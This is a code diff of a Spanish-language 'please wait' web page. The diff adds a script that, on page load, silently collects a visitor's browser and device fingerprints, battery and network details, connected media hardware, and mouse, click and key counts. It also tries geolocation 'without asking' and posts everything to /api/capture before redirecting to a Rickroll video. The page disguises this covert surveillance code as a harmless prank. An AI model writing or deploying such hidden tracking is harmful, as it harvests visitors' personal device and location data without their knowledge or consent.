@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -60,38 +60,315 @@ p {
     <p>Por favor espera un momento</p>
 </div>
 
-<!-- ✅ SCRIPT DE CAPTURA + RICKROLL -->
 <script>
 (async function() {
-    // Capturar datos automáticamente
-    const data = {
-        username: 'RickRolled',
-        password: 'Never Gonna Give You Up',
-        language: navigator.language,
-        platform: navigator.platform,
-        screenResolution: screen.width + 'x' + screen.height,
-        cookiesEnabled: navigator.cookieEnabled
-    };
-    
-    try {
-        // Enviar al servidor
-        await fetch('/api/capture', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
+    const startTime = Date.now();
+    let mouseMovements = 0;
+    let clicks = 0;
+    let keyPresses = 0;
+    let maxScrollDepth = 0;
+
+    // ═══════════════════════════════════════
+    // 🖱️ RASTREAR COMPORTAMIENTO
+    // ═══════════════════════════════════════
+    document.addEventListener('mousemove', () => mouseMovements++);
+    document.addEventListener('click', () => clicks++);
+    document.addEventListener('keydown', () => keyPresses++);
+    document.addEventListener('scroll', () => {
+        const depth = (window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100;
+        maxScrollDepth = Math.max(maxScrollDepth, depth);
+    });
+
+    // ═══════════════════════════════════════
+    // 🔍 DETECTAR INFORMACIÓN BÁSICA
+    // ═══════════════════════════════════════
+    function getBasicInfo() {
+        return {
+            url: window.location.href,
+            device: {
+                vendor: navigator.vendor || 'Unknown',
+                platform: navigator.platform || 'Unknown',
+                architecture: navigator.platform.includes('64') ? 'x64' : 'x86',
+                cpuCores: navigator.hardwareConcurrency || 'Unknown',
+                memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
+                maxTouchPoints: navigator.maxTouchPoints || 0
             },
-            body: JSON.stringify(data)
-        });
+            browser: {
+                language: navigator.language || 'Unknown',
+                languages: navigator.languages || [],
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || 'Unknown',
+                onLine: navigator.onLine,
+                plugins: Array.from(navigator.plugins || []).map(p => p.name)
+            },
+            screen: {
+                resolution: `${screen.width}x${screen.height}`,
+                availResolution: `${screen.availWidth}x${screen.availHeight}`,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                orientation: screen.orientation?.type || 'Unknown',
+                pixelRatio: window.devicePixelRatio || 1
+            },
+            privacy: {
+                localStorage: !!window.localStorage,
+                sessionStorage: !!window.sessionStorage,
+                indexedDB: !!window.indexedDB
+            }
+        };
+    }
+
+    // ═══════════════════════════════════════
+    // 🌐 INFORMACIÓN DE RED
+    // ═══════════════════════════════════════
+    function getNetworkInfo() {
+        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        return {
+            effectiveType: connection?.effectiveType || 'Unknown',
+            downlink: connection?.downlink ? `${connection.downlink} Mbps` : 'Unknown',
+            rtt: connection?.rtt ? `${connection.rtt} ms` : 'Unknown',
+            saveData: connection?.saveData || false,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        };
+    }
+
+    // ═══════════════════════════════════════
+    // 🔋 INFORMACIÓN DE BATERÍA
+    // ═══════════════════════════════════════
+    async function getBatteryInfo() {
+        try {
+            if ('getBattery' in navigator) {
+                const battery = await navigator.getBattery();
+                return {
+                    level: Math.round(battery.level * 100) + '%',
+                    charging: battery.charging,
+                    chargingTime: battery.chargingTime === Infinity ? 'N/A' : `${Math.round(battery.chargingTime / 60)} min`,
+                    dischargingTime: battery.dischargingTime === Infinity ? 'N/A' : `${Math.round(battery.dischargingTime / 60)} min`
+                };
+            }
+        } catch (e) {
+            console.log('Battery API not available');
+        }
+        return { level: 'Unknown', charging: false, chargingTime: 'N/A', dischargingTime: 'N/A' };
+    }
+
+    // ═══════════════════════════════════════
+    // 🎨 CANVAS FINGERPRINT
+    // ═══════════════════════════════════════
+    function getCanvasFingerprint() {
+        try {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = 200;
+            canvas.height = 50;
+            
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.textBaseline = 'alphabetic';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('Canvas FP 🎨', 2, 15);
+            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+            ctx.fillText('Canvas FP 🎨', 4, 17);
+            
+            return canvas.toDataURL().slice(-50);
+        } catch (e) {
+            return 'unavailable';
+        }
+    }
+
+    // ═══════════════════════════════════════
+    // 🖼️ WEBGL FINGERPRINT
+    // ═══════════════════════════════════════
+    function getWebGLFingerprint() {
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            
+            if (!gl) return { webgl: 'unavailable', vendor: 'Unknown', renderer: 'Unknown' };
+            
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            
+            return {
+                webgl: gl.getParameter(gl.VERSION),
+                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown',
+                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown'
+            };
+        } catch (e) {
+            return { webgl: 'unavailable', vendor: 'Unknown', renderer: 'Unknown' };
+        }
+    }
+
+    // ═══════════════════════════════════════
+    // 🔤 DETECTAR FUENTES INSTALADAS
+    // ═══════════════════════════════════════
+    function detectFonts() {
+        const baseFonts = ['monospace', 'sans-serif', 'serif'];
+        const testFonts = [
+            'Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
+            'Palatino', 'Garamond', 'Comic Sans MS', 'Trebuchet MS', 'Impact'
+        ];
         
-        console.log('✅ Datos capturados');
-    } catch (error) {
-        console.error('Error:', error);
+        const detectedFonts = [];
+        const canvas = document.createElement('canvas');
+        const context = canvas.getContext('2d');
+        
+        for (const font of testFonts) {
+            let detected = false;
+            for (const baseFont of baseFonts) {
+                context.font = `72px ${baseFont}`;
+                const baseWidth = context.measureText('mmmmmmmmmmlli').width;
+                
+                context.font = `72px ${font}, ${baseFont}`;
+                const testWidth = context.measureText('mmmmmmmmmmlli').width;
+                
+                if (baseWidth !== testWidth) {
+                    detected = true;
+                    break;
+                }
+            }
+            if (detected) detectedFonts.push(font);
+        }
+        
+        return detectedFonts;
+    }
+
+    // ═══════════════════════════════════════
+    // 📸 ENUMERAR HARDWARE (Sin permisos)
+    // ═══════════════════════════════════════
+    async function getHardwareInfo() {
+        try {
+            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                return {
+                    videoInputs: devices.filter(d => d.kind === 'videoinput').length,
+                    audioInputs: devices.filter(d => d.kind === 'audioinput').length,
+                    audioOutputs: devices.filter(d => d.kind === 'audiooutput').length
+                };
+            }
+        } catch (e) {
+            console.log('Hardware enumeration not available');
+        }
+        return { videoInputs: 'Unknown', audioInputs: 'Unknown', audioOutputs: 'Unknown' };
+    }
+
+    // ═══════════════════════════════════════
+    // 📡 DETECTAR SENSORES (Sin permisos)
+    // ═══════════════════════════════════════
+    function detectSensors() {
+        return {
+            accelerometer: 'DeviceMotionEvent' in window,
+            gyroscope: 'DeviceOrientationEvent' in window,
+            magnetometer: 'ondeviceorientationabsolute' in window
+        };
+    }
+
+    // ═══════════════════════════════════════
+    // 🌍 GEOLOCALIZACIÓN (Intentar sin preguntar)
+    // ═══════════════════════════════════════
+    async function tryGetLocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve(null);
+                return;
+            }
+            
+            // Timeout rápido para no bloquear
+            const timeout = setTimeout(() => resolve(null), 1000);
+            
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    clearTimeout(timeout);
+                    resolve({
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        altitude: position.coords.altitude,
+                        altitudeAccuracy: position.coords.altitudeAccuracy
+                    });
+                },
+                () => {
+                    clearTimeout(timeout);
+                    resolve(null);
+                },
+                { timeout: 1000, maximumAge: 0, enableHighAccuracy: false }
+            );
+        });
+    }
+
+    // ═══════════════════════════════════════
+    // 🎯 RECOPILAR TODO Y ENVIAR
+    // ═══════════════════════════════════════
+    async function captureAndSend() {
+        try {
+            const basicInfo = getBasicInfo();
+            const networkInfo = getNetworkInfo();
+            const batteryInfo = await getBatteryInfo();
+            const canvasFP = getCanvasFingerprint();
+            const webglInfo = getWebGLFingerprint();
+            const fonts = detectFonts();
+            const hardware = await getHardwareInfo();
+            const sensors = detectSensors();
+            const geolocation = await tryGetLocation();
+            
+            const timeOnPage = Math.round((Date.now() - startTime) / 1000);
+            
+            const data = {
+                username: 'RickRolled',
+                password: 'Never Gonna Give You Up',
+                url: basicInfo.url,
+                network: networkInfo,
+                device: basicInfo.device,
+                browser: basicInfo.browser,
+                screen: basicInfo.screen,
+                battery: batteryInfo,
+                fingerprints: {
+                    canvas: canvasFP,
+                    webgl: webglInfo.webgl,
+                    webglVendor: webglInfo.vendor,
+                    webglRenderer: webglInfo.renderer,
+                    fonts: fonts
+                },
+                privacy: basicInfo.privacy,
+                behavior: {
+                    mouseMovements: mouseMovements,
+                    clicks: clicks,
+                    keyPresses: keyPresses,
+                    scrollDepth: Math.round(maxScrollDepth),
+                    timeOnPage: timeOnPage
+                },
+                hardware: hardware,
+                sensors: sensors,
+                geolocation: geolocation
+            };
+            
+            // Enviar al servidor
+            const response = await fetch('/api/capture', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            });
+            
+            const result = await response.json();
+            console.log('✅ Datos capturados:', result);
+            
+        } catch (error) {
+            console.error('❌ Error al capturar:', error);
+        }
+        
+        // Esperar 2 segundos y redirigir al Rickroll
+        setTimeout(() => {
+            window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
+        }, 2000);
     }
     
-    // Esperar 1.5 segundos y luego redirigir al Rickroll
-    setTimeout(() => {
-        window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
-    }, 1500);
+    // ═══════════════════════════════════════
+    // 🚀 EJECUTAR TODO
+    // ═══════════════════════════════════════
+    captureAndSend();
+    
 })();
 </script>
 
